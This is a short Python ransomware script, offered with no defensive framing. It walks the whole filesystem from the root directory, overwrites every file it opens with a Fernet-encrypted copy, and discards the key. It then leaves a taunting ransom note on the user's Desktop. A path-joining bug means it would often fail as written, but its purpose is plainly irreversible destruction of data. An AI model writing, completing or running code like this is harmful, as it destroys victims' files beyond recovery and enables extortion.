from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
fernet = Fernet(key)
rootdir = '/'

for subdir, dirs, files in os.walk(rootdir):
    for file in files:
        print(os.path.join(subdir, file))
        with open(subdir + file, 'rb') as to:
            original = to.read()

        encrypted = fernet.encrypt(original)

        with open(subdir + file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

user = os.getlogin()
print(str(user))

f = open("/home/"+str(user)+"/Desktop/warning.txt", "w")
f.write("You've been ransomed. L. Sucks to Suck")
f.close()
